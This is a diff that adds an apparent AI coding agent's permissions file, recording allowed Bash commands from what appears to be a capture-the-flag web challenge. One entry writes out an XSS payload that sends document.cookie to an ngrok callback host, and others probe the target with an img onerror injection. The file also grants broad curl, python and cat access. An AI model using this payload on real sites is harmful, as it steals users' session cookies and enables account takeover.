@@ -1,0 +1,17 @@
+{
+  "permissions": {
+    "allow": [
+      "Bash(where ngrok)",
+      "Bash(python:*)",
+      "Bash(curl -s \"https://web-ripple-of-past-revirie-a8hd38x0.amt.rs/\")",
+      "Bash(curl -s \"https://web-ripple-of-past-revirie-a8hd38x0.amt.rs/?username=test\")",
+      "Bash(curl -s \"https://web-ripple-of-past-revirie-a8hd38x0.amt.rs/?username=%3Cimg%20src=x%20onerror=alert(1)%3E\")",
+      "Bash(cat:*)",
+      "Bash(echo '<iframe srcdoc=\"\"\"\"<meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src '\"''''\"'unsafe-inline'\"''''\"'&quot;><script>location='\"''''\"'https://fimbrillate-intersegmental-shelli.ngrok-free.dev/?c='\"''''\"'+document.cookie</script>\"\"\"\"></iframe>')",
+      "Bash(curl:*)",
+      "Bash(nslookup:*)"
+    ],
+    "deny": [],
+    "ask": []
+  }
+}
